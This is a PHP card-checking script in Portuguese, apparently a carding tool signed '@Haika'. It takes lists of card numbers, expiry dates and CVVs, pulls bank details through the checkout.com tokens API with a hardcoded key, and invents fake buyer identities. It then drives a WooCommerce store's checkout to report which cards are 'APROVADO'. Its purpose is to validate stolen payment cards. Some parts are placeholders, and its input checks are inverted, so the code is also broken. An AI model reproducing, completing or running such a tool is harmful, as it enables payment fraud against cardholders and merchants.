<?php

error_reporting(0);

$get = $_GET['lista'];
$explode = explode("|", $get);
[$cc, $mes, $ano, $cvv] = $explode;

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function GenerateUsers(){
    $rand = rand(10, 10000000000);
    $names = ['haika', 'kelly', 'jessica', 'lucas', 'joao', 'maria', 'pedro', 'ana', 'carlos', 'julia', 'fernanda', 'gabriel', 'isabela', 'henrique', 'lara', 'matheus', 'natalia', 'olivia', 'pedro', 'queiroz', 'rebecca', 'samuel', 'thais', 'vinicius', 'yasmin', 'zoe'];
    $sub_names = ['silva', 'franco', 'santos', 'oliveira', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira', 'sousa', 'rodrigues', 'sousa', 'lima', 'gomes', 'ferreira'];
    $name = $names[rand(0, count($names) - 1)];
    $sub_name = $sub_names[rand(0, count($sub_names) - 1)];
    $name_full = "$name $sub_name";
    $email = $name.$rand.'@gmail.com';

    return [
        'email' => $email,
        'name_full' => $name_full,
        'name' => $name,
        'sub_name' => $sub_name
    ];
}

if(empty($cc) || empty($mes) || empty($ano) || empty($cvv)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
} if (strlen($cc) != 16 || strlen($mes) != 2 || strlen($ano) != 4 || strlen($cvv) != 3){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
} if (is_numeric($cc) || is_numeric($mes) || is_numeric($ano) || is_numeric($cvv)){
    echo '<span class="badge badge-danger">🧨 # ERRO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">[Erro Interno] @Haika</span><br>';
    exit();
}

$users = GenerateUsers();
$cookiecount = "woo_".rand(10, 10000000000)."";

$c = curl_init();
curl_setopt($c, CURLOPT_URL, "https://api.checkout.com/tokens");
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: */*',
'authorization: pk_wf64cebluwwe46fsf7fgb3l5umk',
'content-type: application/json',
'origin: https://js.checkout.com',
'referer: https://js.checkout.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/98.0.0.0'));
curl_setopt($c, CURLOPT_POSTFIELDS, '{"type":"card","number":"'.$cc.'","expiry_month":11,"expiry_year":2028,"cvv":"483","name":"haikarajadas Regina","billing_address":{"address_line1":"Haikara Izakaya","city":"Paris","state":"IDF","zip":"75011","country":"FR"},"phone":{"number":"5519996831732"},"preferred_scheme":"","requestSource":"JS"}');
$puxarbins = curl_exec($c);
$pais = getStr($puxarbins, '"issuer_country":"','",');
$bandeira = getStr($puxarbins, '"scheme":"','",');
$tipo = getStr($puxarbins, '"card_type":"','",');
$nivel = getStr($puxarbins, '"product_type":"','"');
$banco = getStr($puxarbins, '"issuer":"','",');
$INFO = "$bandeira $banco $tipo $nivel ($pais)";
$informacoes = strtolower($INFO);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://lojateste.com.br/produto/produto-teste/');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' ,
'content-type: multipart/form-data; boundary=----WebKitFormBoundarypcCyzNtJXCXcjeTt' ,
'origin: https://lojateste.com.br' ,
'referer: https://lojateste.com.br/produto/produto-teste/' ,
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'Your Post <3');
$add_cart = curl_exec($c);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://lojateste.com.br/finalizar-compra/'); // finalizar-compra ou checkout vai do site
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' ,
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
));
$checkout = curl_exec($c);

$nonce = getStr($checkout, 'name="woocommerce-process-checkout-nonce" value="','"');
$email = $users['email'];
$nome = $users['name_full'];

// if (preg_match('/name="rede_card_nonce"[^>]*value="([^"]+)"/', $checkout, $matches)) {
//   $rede_card_nonce = $matches[1];
// } use caso a gateway for rede.

$c = curl_init();
curl_setopt($c, CURLOPT_URL, 'https://lojateste.com.br/?wc-ajax=checkout');
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01' ,
'content-type: application/x-www-form-urlencoded; charset=UTF-8' ,
'origin: https://lojateste.com.br' ,
'referer: https://lojateste.com.br/finalizar-compra/' ,
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' ,
'x-requested-with: XMLHttpRequest'
));
curl_setopt($c, CURLOPT_POSTFIELDS, 'Your Post <3');
$f = curl_exec($c);

$r = getStr($f, '"redirect":"','"');
$r = str_replace('\/','/',$r);

$c = curl_init();
curl_setopt($c, CURLOPT_URL, $r);
curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($c, CURLOPT_COOKIEJAR, getcwd()."/$cookiecount.txt");
curl_setopt($c, CURLOPT_COOKIEFILE, getcwd()."/$cookiecount.txt");
$redi_Res = curl_exec($c);

$retorno = getStr($redi_Res, '<b>LR:</b>','<br />');

if(stripos($redi_Res, 'APROVAD')){
  echo '<span class="badge badge-success">✅ # APROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-success">[Pagamento Aprovado!] @Haika </span><br>';
}else{
echo '<span class="badge badge-danger">🧨 # REPROVADO </span> » ['.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'] » ['.$informacoes.'] » <span class="badge badge-danger">['.$retorno.'] @Haika</span><br>';
}

if (file_exists($cookiecount.'.txt')){
  unlink($cookiecount.'.txt');
}

?>
